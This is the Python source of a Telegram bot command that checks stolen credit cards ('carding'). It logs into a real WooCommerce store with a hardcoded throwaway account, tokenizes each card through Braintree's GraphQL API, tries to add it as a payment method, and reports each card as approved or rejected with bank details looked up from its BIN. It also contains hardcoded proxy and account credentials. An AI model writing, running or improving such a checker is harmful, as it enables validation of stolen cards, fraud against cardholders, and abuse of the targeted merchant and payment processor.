import urllib.parse
import requests
from pyrogram import Client, filters
from pyrogram.types import Message
import random
from helpers.timemanager import run_sync_in_thread
import base64, json, uuid, string, time, os
import re
from bot import LOGGER

# Disable urllib3 warnings
requests.packages.urllib3.disable_warnings()

def id_session():
    uuid_session = str(uuid.uuid4())
    return uuid_session

def generate_custom_id():
    base_uuid = str(uuid.uuid4())
    custom_id = f"0_{base_uuid[:8]}-{base_uuid[9:13]}-{base_uuid[14:18]}-{base_uuid[19:23]}-{base_uuid[24:]}"
    return custom_id

def email_braintree():
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
    return email 


def id_session():
    uuid_session = str(uuid.uuid4())
    return uuid_session


session = requests.Session()



def extract_value(source, left, right):
    """ Extract value from the source based on delimiters """
    try:
        start = source.index(left) + len(left)
        end = source.index(right, start)
        return source[start:end]
    except ValueError:
        return None


@Client.on_message(filters.command('b3'))
async def check_card(bot: Client, cmd: Message):
    return await cmd.reply_text('We are currently working on this feature. Please try again later.')
    status = await cmd.reply_text("<b>⎚ `Processing ...`</b>")

    
    # Check if the command is a reply to a message with a text/plain document
    if cmd.reply_to_message and cmd.reply_to_message.document and cmd.reply_to_message.document.mime_type == 'text/plain':
        try:
            # Download the document containing card data
            cards_path = await cmd.reply_to_message.download()
            with open(cards_path, 'r', encoding='utf-8') as f:
                for line in f:
                    # Process each line in the file
                    c = line.strip()
                    try:
                        cc, exp, ex, cvc = c.split('|')[:4]  # Split once and unpack
                        exp = exp.strip()
                        ex = ex.strip()
                        cvc = cvc.strip()
                        
                        # Extract expiration year from the 'ex' field
                        if len(ex) == 4:
                            exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
                        elif len(ex) == 2:
                            exy = ex
                        else:
                            exy = "20" + ex  # Handle other cases (e.g., only two digits)
                        
                        # Handle specific conditions
                        if exy in ['21', '22', '23', '24']:
                            exy = exy[0] + '7'
                        time.sleep(8)
                        # Call your check_vbv function
                        await Braintree_auth_request(cc.strip(), exp, exy, cvc, bot, cmd)
                    except ValueError:
                        print(f"Error parsing line: {c}")
                await status.delete()
        except Exception as e:
            print(f"Error processing file: {e}")
        finally:
            os.remove(cards_path)
    elif cmd.text:
        try:
            data = cmd.text.split("/b3", 1)[1].strip().split('|')
            if len(data) < 4:
                raise IndexError("Not enough data provided")
            
            cc = data[0].strip()
            exp = data[1].strip()
            ex = data[2].strip()
            cvc = data[3].strip()
            
            # Extract expiration year from the 'ex' field
            if len(ex) == 4:
                exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
            elif len(ex) == 2:
                exy = ex
            else:
                exy = "20" + ex  # Handle other cases (e.g., only two digits)
            
            # Handle specific conditions
            if exy in ['21', '22', '23', '24']:
                exy = exy[0] + '7'
            
            # Call your check_vbv function
            await Braintree_auth_request(cc, exp, exy, cvc, bot, cmd)
            await status.delete()
        except IndexError:
            await status.edit_text("<b>⎚ Use <code>/b3 </code> Checks Auth</b>")
        except Exception as e:
            print(f"Error processing command: {e}")
    else:
        await status.edit_text("<b>⎚ Use <code>/b3 </code> Checks Auth</b>")


    

@run_sync_in_thread
def Braintree_auth_request(card_number, exp_month, exp_year, cvv, bot, cmd):

        # Proxy configuration
    username = "31laj5twc3wba0a"
    password = "kmqumffw958teoh"
    proxy = "rp.proxyscrape.com:6060"
    proxy_auth = "{}:{}@{}".format(username, password, proxy)

    proxies = {
    "http": "http://{}".format(proxy_auth),
    # Ensure HTTPS is also set if needed
    "https": "http://{}".format(proxy_auth)
}
    #session.proxies.update(proxies)
    # Input format: card_number|exp_month|exp_year|cvv
    #card_details = "5219910610795706|06|2028|121"
    #card_number, exp_month, exp_year, cvv = card_details.split('|')
    # Initial GET request to obtain the woocommerce-login-nonce
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    response = session.get("https://store.soundware.io/account/add-payment-method/", headers=headers)
    source = response.text
    ln = extract_value(source, 'woocommerce-login-nonce" value="', '"')
    # POST request to login
    login_data = {
        "username": "pireb51444@abatido.com",
        "password": "pireb51444",
        "woocommerce-login-nonce": ln,
        "_wp_http_referer": "/account/add-payment-method/",
        "login": "Log+in"
    }
    time.sleep(2)
    response = session.post("https://store.soundware.io/account/add-payment-method/", data=login_data, headers=headers)
    source = response.text
    with open('test.txt', 'w', encoding='utf-8') as a:
        a.writelines(source)
    print(source)
    pn = extract_value(source, 'woocommerce-add-payment-method-nonce" value="', '"')
    br = extract_value(source, 'wc_braintree_client_token = ["', '"];')
    print(pn,'\n', br)
    # Decode the Braintree client token
    brr = json.loads(base64.b64decode(br))
    brrr = brr['authorizationFingerprint']

    # POST request to Braintree API to tokenize the credit card
    braintree_headers = {
        "Host": "payments.braintree-api.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Authorization": f"Bearer {brrr}",
        "Braintree-Version": "2018-05-10",
        "Origin": "https://assets.braintreegateway.com",
        "Referer": "https://assets.braintreegateway.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "Te": "trailers"
    }
    braintree_data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": id_session()
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_number,
                    "expirationMonth": exp_month,
                    "expirationYear": exp_year,
                    "cvv": cvv,
                    "billingAddress": {}
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    auth_data = {"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":id_session()},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}
    #print(braintree_data)
    time.sleep(2)
    braintree_auth = session.post(url='https://payments.braintree-api.com/graphql', headers=braintree_headers, json=auth_data)
    braintree_auth_data = braintree_auth.text

    time.sleep(2)
    response = requests.post("https://payments.braintree-api.com/graphql", json=braintree_data, headers=braintree_headers)
    source = response.text
    pm = extract_value(source, 'tokenizeCreditCard":{"token":"', '"')
    client_id = extract_value(braintree_auth_data, '"clientId":"', '"')
    braintree_id = extract_value(braintree_auth_data, '"braintreeClientId":"', '"')
    #print(pm)
    final_data = {
        "payment_method": "braintree_cc",
        "braintree_cc_nonce_key": pm,
        "braintree_cc_device_data": "",
        "braintree_cc_3ds_nonce_key": "",
        "braintree_cc_config_data": json.dumps({
            "environment": "production",
            "clientApiUrl": "https://api.braintreegateway.com:443/merchants/t2bvvzgq2xpg5ryq/client_api",
            "assetsUrl": "https://assets.braintreegateway.com",
            "analytics": {
                "url": "https://client-analytics.braintreegateway.com/t2bvvzgq2xpg5ryq"
            },
            "merchantId": "t2bvvzgq2xpg5ryq",
            "venmo": "off",
            "graphQL": {
                "url": "https://payments.braintree-api.com/graphql",
                "features": ["tokenize_credit_cards"]
            },
            "kount": {
                "kountMerchantId": None
            },
            "challenges": ["cvv"],
            "creditCards": {
                "supportedCardTypes": ["MasterCard", "Visa", "Discover", "JCB", "American Express", "UnionPay"]
            },
            "threeDSecureEnabled": False,
            "threeDSecure": None,
            "paypalEnabled": True,
            "paypal": {
                "displayName": "Sonic Sounds",
                "clientId": f"{client_id}",
                "assetsUrl": "https://checkout.paypal.com",
                "environment": "live",
                "environmentNoNetwork": False,
                "unvettedMerchant": False,
                "braintreeClientId": f"{braintree_id}",
                "billingAgreementsEnabled": True,
                "merchantAccountId": "sonicsounds_instant",
                "payeeEmail": None,
                "currencyIsoCode": "USD"
            }
        }),
        "stripe_cc_token_key": "",
        "stripe_cc_payment_intent_key": "",
        "woocommerce-add-payment-method-nonce": pn,
        "_wp_http_referer": "/account/add-payment-method/",
        "woocommerce_add_payment_method": 1
    }
    #print(final_data)
    time.sleep(4)
    response = session.post("https://store.soundware.io/account/add-payment-method/", data=final_data, headers=headers)
    source = response.text
    #print(source)

    req = requests.get(f"https://bins.antipublic.cc/bins/{card_number[:6]}", verify=True)
    requ = req.json()

    # Extract error and success messages
    error_message = extract_value(source, 'woocommerce-error" role="alert">', '</div>')
    success_message = extract_value(source, 'woocommerce-message" role="alert">', '</div>')
    reason = extract_value(source, 'Reason:', '</li>')
    
    LOGGER.info(reason)

    if error_message or success_message:
        if success_message is not None:
            message_text = f"""
<b>⎚ Approved ✅</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{card_number}|{exp_month}|{exp_year}|{cvv}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth
<b>Status ⇾ Approved </b>

<b>BIN ⇾</b> <code>{card_number[:6]}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
"""
        else:
            message_text = f"""
<b>⎚ Rejected ❌</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{card_number}|{exp_month}|{exp_year}|{cvv}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth
<b>Status ⇾ {reason if reason else 'Unknown'} </b>

<b>BIN ⇾</b> <code>{card_number[:6]}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(0, 9)} seconds</code>
"""
        
        # Assuming cmd.reply_text is a method to send the message
        cmd.reply_text(message_text)
    else:
        LOGGER.warning("No error or success message found.")
